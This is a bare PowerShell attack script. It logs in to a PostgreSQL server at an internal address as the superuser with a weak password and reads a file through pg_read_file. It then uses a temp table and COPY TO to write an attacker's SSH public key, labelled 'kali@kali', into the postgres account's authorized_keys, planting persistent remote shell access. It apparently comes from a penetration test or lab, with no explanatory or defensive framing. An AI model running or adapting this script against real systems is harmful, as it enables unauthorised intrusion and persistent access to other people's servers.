$c=New-Object System.Data.Odbc.OdbcConnection
$c.ConnectionString="Driver={PostgreSQL Unicode};Server=10.9.101.3;Port=5432;Database=postgres;Uid=postgres;Pwd=x;sslmode=disable"
try {
    $c.Open()
    Write-Host "CONNECTED"
    
    # Check postgres home dir
    $cmd=$c.CreateCommand()
    $cmd.CommandText="SELECT setting FROM pg_settings WHERE name='data_directory'"
    $r=$cmd.ExecuteReader()
    while($r.Read()){Write-Host ("DATADIR:"+$r[0])}
    $r.Close()
    
    # Create .ssh dir if not exists, write authorized_keys
    # Use lo_import/lo_export approach
    $cmd2=$c.CreateCommand()
    $cmd2.CommandText="SELECT pg_read_file('/var/lib/postgresql/.ssh/authorized_keys')"
    try {
        $r2=$cmd2.ExecuteReader()
        while($r2.Read()){Write-Host ("EXISTING_KEY:"+$r2[0])}
        $r2.Close()
    } catch {
        Write-Host "NO_EXISTING_KEYS"
    }
    
    # Write key via COPY FROM stdin approach using temp table
    $cmd3=$c.CreateCommand()
    $cmd3.CommandText="CREATE TEMP TABLE ssh_key(k text)"
    $cmd3.ExecuteNonQuery() | Out-Null
    
    $cmd4=$c.CreateCommand()
    $cmd4.CommandText="INSERT INTO ssh_key VALUES('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIkFBfoRyItDwN4LzpB8/7rMu3OgdoPxD01TWchngZYl kali@kali')"
    $cmd4.ExecuteNonQuery() | Out-Null
    
    # Try COPY TO to write the file
    $cmd5=$c.CreateCommand()
    $cmd5.CommandText="COPY ssh_key TO '/var/lib/postgresql/.ssh/authorized_keys'"
    $cmd5.ExecuteNonQuery() | Out-Null
    Write-Host "SSH_KEY_WRITTEN"
    
} catch {
    Write-Host ("ERR:"+$_)
}
$c.Close()
